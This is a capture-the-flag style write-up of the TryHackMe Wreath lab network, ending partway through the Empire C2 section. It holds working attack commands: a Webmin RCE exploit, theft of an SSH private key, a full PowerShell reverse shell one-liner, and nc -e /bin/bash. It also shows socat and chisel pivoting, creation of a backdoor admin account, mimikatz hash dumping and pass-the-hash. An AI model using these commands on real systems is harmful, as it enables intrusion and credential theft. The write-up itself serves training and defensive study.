---
published: true
---
Pivoted through a network and compromising a public facing web machine and proceeding to tunnel traffic to access other machines in Wreath's network. Focus on full scope penetration test incorporating the Empire C2 Framework.

----------

Legal Notice && Usage: *The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.* *By continuing, you acknowledge the aforementioned user risk/responsibilities.*

----------

# Targets:
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649090713587_image.png)


# Enumeration

Quick Nmap Scan:

    nmap 10.200.90.200

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648851267966_image.png)

Detailed port scan

    nmap -p1-15000 10.200.90.200

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648851777349_image.png)

4 Open Ports on the target on Centos operating system.

## Task 5 Webserver Enumeration

http://10.200.90.200 redirects to https://thomaswreath.thm/

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648851856888_image.png)

Add thomaswreath.thm to host file:

**Reload Page after Virtual Routing**

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648852456235_image.png)

**Mobile Number**
+447821548812

# Webserver
## Task 6  Webserver Exploitation

Using CVE-2019-15107 Webmin RCE to access target system:

Clone/Execute: 

    git clone https://github.com/MuirlandOracle/CVE-2019-15107
    cd CVE-2019-15107 && pip3 install -r requirements.txt
    sudo apt install python3-pip
    chmod +x ./CVE-2019-15107.py
    ./CVE-2019-15107.py 10.200.90.200

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648919233642_image.png)

Pseudo shell is created and will need to pivot to an actual shell.

**Reverse Shell**
Create reverse shell using `shell` and setup listener on attacking machine:

    rlwrap nc -lvnp 80

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648919471861_image.png)

**Captured .ssh Private key + Access Target**
under `/root/.ssh/id_rsa`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648919592721_image.png)

Downloaded private key locally to attacking machine and change mod to 600 and initiate an ssh connection:

    chmod 600 id_rsa
    ssh -i id_rsa root@10.200.90.200

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648919785078_image.png)


# Pivoting
## Task 8  Pivoting High-level Overview

There are two main methods encompassed in this area of pentesting:

- **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be *tunnelled* inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall
- **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host

**Tools:**

- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)
- chisel (Windows and Unix)
- sshuttle (currently Unix only)

Using Metasploit the tunneling functionality can be accomplished with `pordfwd`


## Task 9  Pivoting Enumeration

Local tools that can be used after comproming target include:

Linux:
`arp -a` - shows ARP cache of machine
`/etc/hosts` - static mapping of local hosts
`/for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`
`/etc/resolv.conf` - displays DNS server infomration
`ifconfig` - network connections and devices

Windows:
`C:\Windows\System32\drivers\etc\hosts` - Windows static mapping of local hosts
`ipconfig /all` - network connections and devices

**Living off the land  - Network Scan**

    for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

Discovered Network Machines:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648922901434_image.png)


Two new targets Identifed:

    10.200.90.1 (broadcast) 
    10.200.90.200
    10.200.90.250 (new)


**Living off the land - Port Scan**
`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

New target port scan:

    for i in {1..65535}; do (echo > /dev/tcp/10.200.90.250/$i) >/dev/null 2>&1 && echo $i is open; done

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648923228215_image.png)


Ports 22 - Open
Port 1337 - Open

## Task 10  Pivoting Proxychains & Foxyproxy

**Proxychains**
Can often be slow and nmap scan are not advised. Can be used to proxy through one device into others.

Proxychains Configuration file: `~/etc/proxychains.conf`
*Note: proxychains config file can be added to a folder and laucnhed from that folder where proxychains will use folder over master in /etc/.*


**[ProxyList] - Edit this area

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648923796506_image.png)


Other things to note when scanning through proxychains:

- You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.
- It will be *extremely* slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library

**Foxyproxy**
Standard tool to be used with Burp Suite to easly switch between network/port devices through Firefox browser


## Task 11  Pivoting SSH Tunnelling / Port Forwarding

**Forwarding Connections**

Port Forwarding:
Using SSH connections to create forwarded connections with `-L` (Local Port)
`ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`

Access to websit on 172.16.0.10 through 172.16.05 by navigating through 8000.  On the attacking machine accomplished by `localhost:8000`.

`-fN` - backgrounds shell immediately allow attacker terminal back
`-N` - tell SSH doesn’t need to execute any commands (only on setup connection)


Proxies:
Using SSH connections to create proxy:
`ssh -D 1337 user@172.16.0.5 -fN`

`-D 1337` - will open port on 1337 on attacking box to sen data to protected network 
`-fN` - swtiches shell to background, should align with settings in proxychains configuration file.

**Reverse Connections**
create an ssh key/pair with `ssh-keygen`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648924949772_image.png)



Copy contents of `.pub` to `~/.ssh/authorized_keys` on second line add:

    command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty

`authorized_keys` example:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648925042587_image.png)



 **Transfer private key to target box**

    ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

keys should be discarded after engagement.

Create a reverse portforward example:

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")

    ssh -R 22:172.16.0.100:2222 kali@172.16.0.200 -i id_rsa -fN

Create a forward proxy example:

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

    ssh -L 8000 user@target.thm -fN

Create SSH access to webserver through port 80

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

    ssh -L 8000:127.0.0.1:80 user@172.16.0.50


## Task 12  Pivoting plink.exe

Plink is a Windows based connection tool used by PuTTY and can be used for SSH acting as client.


    cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

`puttygen` can be used to conver OpenSSH keys into PuTTY style keys.


## Task 13  Pivoting Socat

Great pivoting tool for fully stable linux shells. Static binaries are avaiable for both Linux and Windows (will likely not pass antivirus). To be of not that the syntax required for socat may become complicated.

![Diagram demonstrating the purpose of a relay to forward a shell back from a target PC](https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png)


**Socat example with Python webserver**
Create webserver on attacking machine:

    python3 -m http.server 80 

on target machine:

    curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648928419334_image.png)


**Reverse Shell - Socat**
Locally set up listener: `rlwrap nc -lvnp 80`

Create connection tunnel with socat

    ./socat-exec tcp-1:9000 tcp:10.50.91.32 &

next upload `nc` to target via curl:

    curl 10.50.91.32/nc -o nc-exec

Create connection via localhost and created port 9000

    ./nc-exec 127.0.0.1 9000 -e /bin/bash

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648929380375_image.png)

**Port Forwarding - Easy**
Opens up a port on compromised server and redirects whattever come into the target server  to another server/port


    ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

from the example port 33060 redirects input from attacking machine to intented target server.

`fork` - puts every connect into a new process
`reuseadd` - port stays open after connection is made to it
`&` - background shell

**Port Forwarding - Quite**
previous easy port forward can be easily seen from netwok scanners thus acts a secondary means to create a port forward from a compromised machine.

on attacking machine:
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
opens ports: 8000 and 8001 to create a local port relay

compromised target:
`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`
connection is made from port 8001 on attacking machine to open port.

Example:

If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

    ./socat tcp-l:8000 tcp:172.16.0.200:443

Example

What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

    ./socat tcp-l:2222,fork,reuseaddr tcp:127.16.0.100:22


## Task 14  Pivoting Chisel

Chisel is another tool to proxy, tunnel and port forward through compromised systems regardless of SSH access. Written in GoLang and is used via static binaries on Linux and Windows.

Download Chisel: https://github.com/jpillora/chisel/releases
(decompress with gunzip and chmod [+x)](https://paper.dropbox.com/doc/x-l1wfYymiXlrYya8iFeNoL) 

**Chisel - Clients/Servers**

Server Help:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648948100118_image.png)


Client Help:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648948129924_image.png)


**Revers SOCKS Proxy**
On attacking box:

    ./chisel server -p LISTEN_PORT --reverse & #add LISTEN_PORT

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648948752835_image.png)


on Target:

    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648948762229_image.png)


Add information to `/etc/proxychains.conf` to include the new socks proxy

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648949050919_image.png)


**Remote Port Fowarding**
Set up a remote port forward from compromised target to forward.

Attacking box:

    ./chisel server -p LISTEN_PORT --reverse &

Target box:

    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &


**Local Port Forward**
Conenct from attacking machine to chisel server listening on 22 SSH.

Target:

    ./chisel server -p LISTEN_PORT

Attacking:

    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
`./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

**Answer the questions:**
Use port 4242 for the listener and do not background the process.
`./chisel server -p 4242 --reverse`
What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
`./chisel client 172.16.0.200:4242 r:socks`
How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
`./chisel client 172.16.0.100:3306 R:33060:172.16.0.200 &`
If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
`./chisel client 172.16.0.5:4444 8000:172.16.0.10:80`


## Task 15  Pivoting sshuttle

Simulates a VPN that allows for SSH connection to reate tunneled proxy that acts like a new interface. This can be all done without the use of proxychains.

The base command for connecting to a server with sshuttle is as follows:
`sshuttle -r username@address subnet`

Connecting to network example:

    sshuttle -r user@172.16.0.5 172.16.0.0/24
    or
    sshuttle -r username@address -N #automatically attempts to find the subnet


Connection with private key example:

    sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24

**Answer the Questions**
How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

    sshuttle -r pwned@172.16.20.7 172.16.0.0/24 &

What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

    --ssh-cmd "ssh -i priv_key"

You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.
What switch (and argument) could you use to fix this error?

    -x 172.16.0.100


## Task 16  Pivoting Conclusion

Overview of tunneling tools:

- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
- SSH can be used to create both port forwards, and proxies
- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
- sshuttle is a nicer way to create a proxy when we have SSH access on a target


# Git Server


## Enumeration

Move static `nmap` to target with python http.server and “chmod [+x”](https://paper.dropbox.com/doc/x-FCX8YbFCjxMy5vUXMPJMO) 

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648951014968_image.png)


**Nmap scan**

    ./nmap-exec -sn 10.200.90.1-255 -oN scan-exec
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648951117912_image.png)


**Answer the questions**


Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?

    2


In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)

    100,150

Let's assume that the other host is inaccessible from our current position in the network.
Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?

    80,3389,5985


We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section).
Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

    HTTP

Now that we have an idea about the other hosts on the network, we can start looking at some of the tools and techniques we could use to access them!

    No answer needed


## Task 18  **Git Server** Pivoting

Creating connection with sshuttle to internal network:

    sshuttle -r root@10.200.90.200 --ssh-cmd "ssh -i id_rsa" 10.200.90.200/24 -x 10.200.90.200

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648952222659_image.png)


Access `10.200.90.150` via firefox:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648952252888_image.png)


**Answer the questions**

What is the name of the program running the service?

    gitstack

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648952563353_image.png)


Do these default credentials work (Aye/Nay)?

    Nay

You will see that there are three publicly available exploits.
There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?

    43777

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648952656893_image.png)

Download and modify `43777.py`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648953135448_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648953031695_image.png)

**Answer the questions**

Look at the information at the top of the script. On what date was this exploit written?

    18.01.2018


Bearing this in mind, is the script written in Python2 or Python3?

    python2

Just to confirm that you have been paying attention to the script: What is the *name* of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?

    csrftoken


## Task 20  Git Server Exploitation

Exploiting and accessing backdoor:

    curl http://10.200.90.150/web/exploit-exec.php -d "a=whoami"

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1648953510554_image.png)


attacking box - add to `/etc/hosts`:

    gitserver.thm    10.200.90.150

**Answer the questions**

**Bonus Question (Optional):** Using the given code for the exploit we used against the web server, see if you can adapt this exploit to create a full pseudoshell environment.

    No answer needed

First up, let's use some basic enumeration to get to grips with the webshell:
What is the hostname for this target?

    git-serv

What operating system is this target?

    windows

What user is the server running as?

    nt authority\system

This will send three ICMP ping packets back to you.
How many make it to the waiting listener?

    0

**Pivot Machine - CentOS Open Firewall Port**
Open port on pivot machine to setup listener and capture reverse shell (port above 15000):

    firewall-cmd --zone=public --add-port 17000/tcp

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649002703660_image.png)


Setup Listener on Pivot Machine:

    ./nc-exec -lvnp 17000

**Burp - Create POST request**


![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649003315757_image.png)

Testing to ensure `a=whoami` yields a return.

Create reverse shell within `a` and URL encode with https://www.urlencoder.org/

    powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.90.200',17000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    
    powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.90.200%27%2C17000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

Send request through burp:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649003621771_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649003642104_image.png)



## Task 21  Git Server Stabilisation & Post Exploitation

Since RDP (3389) and port 5985 identified in prior scans open on target machine and we are `nt system/authority` we can create a user and RDP to machine.

Create user and add to administrators:

    net user exec password /add
    net localgroup Administrators exec /add
    net localgroup "Remote Management Users" exec /add

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649003974913_image.png)


**EvilWinRM - create connection**

install evil-winrm:

    gem install evil-winrm

connect to target:

    evil-winrm -u exec -p password -i 10.200.90.150

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649004256411_image.png)


full reverse shell from attacking machine to target established.


**RDP Connection**
using `xfreerdp` create a connection to target:

    xfreerdp /v:10.200.90.150 /u:exec /p:'password'

extra `xfreerdp` commands:

- `dynamic-resolution` -- allows us to resize the window, adjusting the resolution of the target in the process
- `/size:WIDTHxHEIGHT` -- sets a specific size for targets that don't resize automatically with `/dynamic-resolution`
- `+clipboard` -- enables clipboard support
- /drive:LOCAL_DIRECTORY,SHARE_NAME` -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called `share`, you could use: `/drive:.,share`, with the period (`.`) referring to the current directory

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649004604590_image.png)


Share to attacking machine enabled.

**Mimikatz**
Transfer mimikatz to target to begin extracting hashes from LSASS and run from an Administrator cmd.exe

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649004933467_image.png)


Elevate token privelage:

    token::elevate


![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649004998962_image.png)


Dump hashes:

    lsadump::sam
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649005054771_image.png)



**Answer the questions**


Create an account on the target. Assign it to the `Administrators` and `Remote Management Users` groups.

    No answer needed


Authenticate with WinRM -- make sure you can get a stable session on the target.

    No answer needed


Authenticate with RDP, sharing a local copy of Mimikatz, then dump the password hashes for the users in the system.
What is the Administrator password hash?

    37db630168e5f82aafa8461e05c6bbd1


What is the NTLM password hash for the user "Thomas"?

     02d90eda8f6b6b06c32d5f207831101f


**Find Passowords to Hashes**
Can use something like hashcat locally to break hashes or online resources that might already have hashes cracked https://crackstation.net/


![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649005231681_image.png)


What is Tomas’ password?

    i<3ruby

**Evil-WinRM Hash Connection**
Connect to target with administrator hash:

    evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.90.150

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649005366415_image.png)



# Command and Control


## Task 23  Command and Control Empire: Installation

Using Empire C2 Framework along with the GUI version Starkiller.

Install Empire:

    apt install powershell-empire starkiller

Start Empire Server

    powershell-empire server

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649005554845_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649005586913_image.png)


Start Empire Client

    powershell-empire client

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649005687244_image.png)


******If hosting C2 on another server:**
With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the `/usr/share/powershell-empire/empire/client/config.yaml` file, or connect manually from the Empire CLI Client using `connect HOSTNAME --username=USERNAME --password=PASSWORD`.

**Launch Starkiller**
In new terminal `starkiller`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649005777237_image.png)

default credentials: `empireadmin:password123`

## Task 24  **Command and Control** Empire: Overview

Powershell Empire has several major sections to it, which we will be covering in the upcoming tasks.

- **Listeners** are fairly self-explanatory. They listen for a connection and facilitate further exploitation
- **Stagers** are essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. They are the delivery mechanism for agents
- **Agents** are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system
- **Modules** are used to in conjunction with agents to perform further exploitation. For example, they can work through an existing agent to dump the password hashes from the server

**Answer the questions**

Read the overview

    No answer needed

Can we get an agent back from the git server directly (Aye/Nay)?

    Nay


## Task 25  **Command and Control** Empire: Listeners

Listeners in Empire are used to receive connections from stagers (which we'll look at in the next task). The default listener is the `HTTP` listener. This is what we will be using here, although there are many others available. It's worth noting that a single listener can be used more than once -- they do not die after their first usage.

**Setup HTTP Listener**

    uselistener http

use `options` to see all avliabl options - Setup Listener

    set Name CLIHTTP
    set Host [ATTACKING IP]
    set Port [PORT]
    execute

to kill:

    kill LISTENER_NAME

**Starkiller (Web GUI) - Setup listener**


![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649007540261_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649007553456_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649007567813_image.png)



## Task 26  **Command and Control** Empire: Stagers

Setup Stager:

    usestager multi/bash
    set Listener CLIHTTP
    execute

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649008020455_image.png)


**Execute stager on target**

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649011551950_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649011568603_image.png)


Interact:

    interact 3AOFUEEQ
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649011636163_image.png)


To kill agent:

    kill AGENT_NAME

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649011695142_image.png)


**Answer the questions**

Using the `help` command for guidance: in Empire CLI, how would we run the `whoami` command inside an agent?

    shell whoami


We have now covered the basics of Empire, with the exception of modules, which we will look at after getting an agent back from the Git Server.
Kill your agents on the webserver then let's look at proxying Empire agents!

    No answer needed



## Task 28  Command and Control Empire: Hop Listeners

Creating hop jump server

**Ensure on the jump box that the firewall has been open - opening port 17000:**

    firewall-cmd --zone=public --add-port 17000/tcp

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649026577975_image.png)


**HTTP_Hop**

    uselistener http_hop
    
    set Host 10.200.90.200 #jump box - initial compromise
    set Port 17000
    set RedirectListener CLIHTTP
    execute

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649024634824_image.png)


Zip and transfer files `/tmp/http_hop` to jump box target:


    zip -r hop.zip http_hop
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649024871331_image.png)


download on target:

    curl 10.50.91.32/hop.zip -o hop.zip
    unzip hop.zip

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649024947490_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649024973349_image.png)


**Answer the questions**

Bearing this in mind, get an agent back from the Git Server!

    No answer needed



## Task 29  Command and Control Git Server

**Create http_hop stager**

    usestager multi/launcher
    set Listener http_hop

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649025470372_image.png)


On jump box (200) setup a PHP Server to host http_hop files:

